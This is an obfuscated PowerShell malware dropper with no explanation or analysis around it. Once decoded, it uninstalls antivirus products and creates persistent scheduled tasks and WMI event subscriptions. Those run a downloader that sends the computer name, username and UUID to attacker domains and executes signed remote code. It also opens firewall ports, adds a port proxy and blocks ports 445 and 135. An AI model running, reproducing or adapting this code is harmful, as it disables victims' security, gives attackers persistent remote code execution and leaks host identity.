(' . ( 9N0PShOME[21]+9N0PsHOmE[30]+qfhXqfh) ((qfhcmd /c staqfh+qfhrt /b wmic.exe product where pgOname like fEH%Eset%fEHpgO call uninstall /noinqfh+qfhteractive
'+'
cmd /c start /b wmic.exe product '+'where pgOname like fEH%%Kasperskyqfh+qfh%%fEHpgO call uninstall /qfh+qfhnointeractivqfh+qfhe

cqfh+qfhmd /c start /b wmic.exe product where pgOnaqfh+qfhme like fEH%avast%fEHpgO call uninsqfh+qfhtall'+' /nointeractive

cmd /c start'+' /b wmic.exe product where pgOname like fEqfh+qfhH%avp'+'%fEHpgO call uninstall /nointeractive

cmd /c start /b wmic.exe prqfh+qfhoduct where pgOname like fEH%Security%fEHpgOqfh+qfh call uninstall /noi'+'nteractive

cmd /c start /b wmic.exe pqfh+qfhroduct where pg'+'Oname like '+'fEHqfh+qfh%AntiVirus%fqfh+qfhEHpgO call uninstall /nointeractive

cmd /c start /b wmic.exe productqfh+qfh where pgOname like fEH%Norton Securityqfh+qfh%fEHpgO caqfh+qfhll qfh+qfhuninstall /nointqfh+qfheractive

qfh+qfhcmd /c pgOC:xJy'+'Prograq'+'fh+qfh~1qfh+qfhxJyM'+'alwarebytesxJyAnti-MalwarexJyunins000.exepgO /verys'+'ilent /suqfh+qfhppqfh+qfhressmsgboxes /norestart'+'

Kqfh+qfhv1v=pgO?Kv1vpgO+(Get-Date -Format fE'+'H_yyyyMMddfE'+'H)

Kv1tmps=fEHfunction a(Kv1u){Kv1d='+'qfh+qfh[texqfh+qfht.enco'+'ding]::qfh+qfhutf8.gqfh+qfhetbytes((qfh+qfhnew-object qfh+qfhI'+'O'+'.Strea'+'mReader([nq'+'fh+qfhet.webrequest]::create(Kv1u).getresponseqfh+qfh().getresponsestream())).reaqfh+qfhdtoend());Kv'+'1c=Kv1d.count;if'+'(qfh+qfhKv1c -'+'gt 173){Kv1b=Kv1d[173..Kv1c];Kv1p=New-Object Securitqfh+qfhy.Cryptograp'+'hy.RSAParametqfh+qfhers;Kv1p.Mq'+'fh+qfhoduqfh+qfhluqfh+qfhs=[coqfh+qfhnveq'+'fh+qfhrt]::FromBase64qfh+qfhString(fEHfEqfh+qfhH2mWo17uXvG1BXpmdgv8v'+'/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2m'+'T/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4'+'iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7qfh+qfhrpfqOLdHa10=fEHfEH);Kv1p.Exponent=0x01,0x00,0x01;Kv1r=New-Object Securit'+'y.Cryptography.RSACryptoServiceProvider;Kv1'+'r.Imqfh+qfhportqfh+qfhParameters(Kv1p);if(Kv1r.verifyData(Kv1b,(New-Obqfh+qf'+'hject Seqfh+qfhcurqfh+qfhity.'+'Crypt'+'ograpqfh+qfhhy.SHA1CryptoServicqf'+'h+'+'qfheProvider),[coqfh+qfhnqfh+qfhvqfh+qfhert]::Fqfh+qfhromBase64String(-join([char[qfh+qfh]]Kv1d[0..171])))qfh+qfh){I'+'ZoWex(-join[char[]]Kv1b)}}}Kv1url=fqfh+qfhEHfEHhttp://fEHfEH+fEHfEHU1fEHfEH+fEHfEH'+'U2fEHfEH+fEHfEH/a.jspfEH+Kv1v+fEH?fEHfEH+(@(Kvqfh+qfh1env:COMPUTERNAME,Kv1env:Uqfh+qfhSERNAME,(get-wmiobject Win32_ComputerSystemProducqfh+qfht).UUID,qfh+qfh(random))-joinfEHfEH*fEHfEH);a(Kv1url)fEH
qfh+qfh
Kv1sa=([qfh+qfhSecurity.Prinqfh+qfhcipal.Window'+'sPrincipal][Security'+'.Principal.WindowsIdentity]::GetCurrent()qfh+qfh).IsInRole([Security.Principal.WindowsBuilqfh+qfhtInRole] pgOAdministqfh+qfhratorpgO)

funct'+'ion getRan(){qf'+'h+qfhreturn -join([char[]](48..57+65..90+97..122)fG9Get-Random -Count (6+(Get-Random)%6))}

Kv1us=@(fEHt.zz3r'+'0.comfEH,fEHt'+'.zker9.comfEH,fEHt.bb3u9.comf'+'EH)

Kv1stsrv = New-Object -ComObjecqfh+qfht Schedule.Service

Kv1stsrv.Connect()

try{

Kv1doit=Kv1stsrv.GetFolder(pgOxJypgO).GetTask(pgOblackballpgO)

}catch{}

if(-not Kv1doit){

if(Kv1sa){

schta'+'sksqfh+qf'+'h /qfh+qfhcreate /ru system'+' /sc MINUTE /mo 12'+'0 /tn blackball /F /tr qfh+qfhpgOblackballpgO

} else {

schtasks /create /sc MINUTE /'+'mo 120 /tn blackball /F /tr '+'pgOblackballpgO

}

fore'+'qfh+qfhach(Kv1u in Kv1us){

Kv1i = [array]::Ind'+'exOfqfh+qfh(Kv1us,Kv1u)

qfh+qfhif(Kv1i%3 -eq 0){Kv1tnfqfh+qf'+'h=fEHfEH}

qfh+qfhif(Kv1i%3 -eq 1){Kv1tnf=qfh+qfhgetRan}

if(Kv1iqfh+q'+'fh%3 -eq 2){'+'if(Kv1sa){Kv1tnf=fEH'+'MicroSoftqfh+qfhxJyWindowsxJyfEqfh+qfhH+(getRan)}else{Kv1tnf=ge'+'tRan}}

Kv1tn = '+'getRan

if(K'+'v1sa){

s'+'chtasks /create /ru system'+' /sc MINUTE /mo 60 /tn qfh+qfhpgOKv1tnfxJyKv1tnpgO /F /tr pgOpowershell -'+'c PSqfh+qfh_CMDpgO

} else {

qfh+qfhschtasks /create /sc MINUTE qfh+qfh/mo 60 /tn pgOqfh+qfhKv1tnfxJyKv1tnpgO'+' /F /tr pgOpo'+'qfh+qfhwershell -w hidden qf'+'h+qfh-c PS_CMDpgO

}

start-sleep 1

Kv1folqfh+qfhder=Kv1stsrv.Gqfh+qfhetFold'+'er(pgOxJyKv1tnfpgO)

Kv1taskitemqfh+qfh=Kv1folder.GetTqfh+qfhasks(1)

qfh+qfhforeach(Kv1tas'+'k in Kv1taskitem){

foreach (Kv1qfh+qfhaction in Kv1taqfh+qfhsk.Definition.Actionsqfh+qfh) {

qfh+qfhqfh+qfhtry{

if(Kv1actqfh'+'+qfhion.Arguments.Contains(pgOPS_CMDpgO)){

Kv1'+'foqfh+qfhlder.RegisterTask(Kv1task.Namqfh+qfhe, Kv1task.Xml.replaceqfh+qfh(pgOPS_CMDpgO,Kv1tmqfh+qfhps.replace(fEHU1fEH,Kv1u.substring(0,5)).replace'+'(fEHU2fqf'+'h+qfhEH,Kv1u.substring(5))), 4, Kv1null, Kv1null, 0,qfh+qfh'+' Kv1null)fG9out-nqfh+qfhull

}

}ca'+'tch{}

}

}

starqfh+qfht-sleep 1

sqfh+qfhchtasks /ruqfh'+'+qfhn /tn pgOK'+'vqfh+qfh1qfh+qfhtnfxJyKv1tnpgO

start-sleep 5

}

}


tr'+'y{

Kqfh+qfhvqf'+'h+qfh1doiqfh+qfht1=Get-Wqfh+qfhMIObject -qfh+qfhClass __Eve'+'ntFilter -Name'+'Space fEHrootxJysubscriptionfEH -qfh+qfhfilter pgOName=fEHb'+'lackballfEqfh+qfhHp'+'gO

}caqfh+qfhtch{}q'+'fh+qfh'+'

if(-not qfh+qfhKv1doit1){

Set-WmiInstance -Class __EventFilter -NameSpace pgOrootxJysubscriptionpgO -Arguments @{Name=pgOblackballpgO;EventNameSpace=pgOrootxJycimv2pgO;QueryLa'+'ngu'+'age=pgOWQLqfh+q'+'fhpgO;Qu'+'ery=pgOSELECT * FROM __Instaqfh'+'+qfhnceModificationEv'+'ent W'+'ITHIN'+' 3600 Wqfh+qfhHERE TargetInstance IS'+'A fEHWin32_Peqfh+qfhrfForqfh+qfhmatte'+'dData_PerfOS'+'_SystemfEHpgO;} -ErrorAction Stopqfh+qfh

foreach(Kv1u iqfh+qfhn Kv1us){
qfh+qfh
Kv1theNam'+'e=getRan

Kv1wmicmd=K'+'v1tmps.replace(fEHU1fEH,Kv1qfh+qfhu.substring(0,5)).'+'replace(fEHU2fEH,Kv1u.substring(5)).replace(fEHa.jspfqfh+qfhEH,fEHaa.jspfEH)

Set-WmiInstance '+'qfh+qfh-Class __Filqfh+qfhte'+'rToConsuqfh+qfhmerBinding -Namesqfh+qfhpace pgOrootxJysubscriptionpgO -Arguments @{Filter=(Set-W'+'miInstance -Class __EventFi'+'lter -NameSpaceqfh+qfh pgOrootxJysubscriptionqfh+qfhpgO -A'+'r'+'gumeqfh+qfhnts @{Name=pgOfpgO+Kv1theName;EventNameSpace=pgOroot'+'xJycimv2pgO;Quqfh'+'+qfheryqfh+qfhL'+'anguage=pgOWQLpgO;qfh+qfhQuery=pgOSEqfh+qfhLECT *'+' FROM __InstanceMo'+'dificqfh+qfhatio'+'nE'+'vent WITHIN 3600 WHERE Tar'+'getInstan'+'ce ISA fEHWin32_PerfFormattqfh+qfhedData_PerfOS_SystemfEHpgO;} -ErrorAction Stqfh+qfhop);Consumer=(Set-WmiIq'+'fh+qf'+'hnstance -Class CommandLineEv'+'entConsum'+'er -Namespace pgOrootxJysubscriptionpgO -Argumen'+'ts @{Name=pgOcpgO+Kv'+'1theNam'+'e;ExecutablePat'+'qfh+qfhh=pgOc:xJywiqfh+qfhndowsx'+'Jysy'+'stem32xJycmd.exepgO;CommandLineTemplate=pgO/c powersqfh+qfhhell -c Kv1wmicmdpgO})}

'+' start-sleep 5
qfh+qfh
}

Set-Itemqfh+qfhProper'+'ty -Path pgOHKLM:xJySYSTEMxqfh+qfhJyCurrentC'+'ontrolSetxJyServicesxJyLanmanServerxJyParameterspgO DisableCompressionqfh+qfh -Type DWORD -Value 1 ???Force
qfh+qfh
}

cmd.e'+'xe /c netsh.qfh+qfhexe '+'firewall add portopeningqfh+qfh tcp 65529 Sqfh+qfhDNSd
qfh+qfh
'+'netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53

netsh advfirewall firewall add rule n'+'ameqfh+qfh'+'=pg'+'Odeny445pgO dir=in protocqfh+qfhol=tcp qfh+qfhlocalport=445 action=blo'+'ck

netsh advfirewall firewall addq'+'fh+qfh rule nam'+'e=pgOdeny135pgO dir=in protocol=tcp locaqfh+qfhlqfh+qfhport=135 acqfh+qfhtion=block


schtasks /delete /tqfh+qfhn Rtqfh+qfhsa2 /F

'+'schtasks /delete /tn Rtsa1 /F

schqfh+qfhtasks /delete /tn Rtsa /Fqfh).RePlacE(([Char]75+[Char]118+[Char]49),qfh9N0qfh).RePlacE(([Char]102+[Char]'+'69+[Char]72),[STrINg][Char]'+'39).RePlacE(qfhf'+'G9qfh,[STrINg][Char'+']124).RePlacE(('+'[Char]120+[Char]74+'+'[Char]121),qfhh83qfh).RePlacE(([Char]90+[Char]111+[Char]87),[STrINg][Char]96).RePlacE(([Char]112+[Char]103+[Char]79),[STrINg][Char'+']34)'+' )

').rePlacE(([cHAr]113+[cHAr]102+[cHAr]104),[StriNG][cHAr]39).rePlacE('9N0','$').rePlacE(([cHAr]104+[cHAr]56+[cHAr]51),[StriNG][cHAr]92)| .( $sHELlid[1]+$shElliD[13]+'X')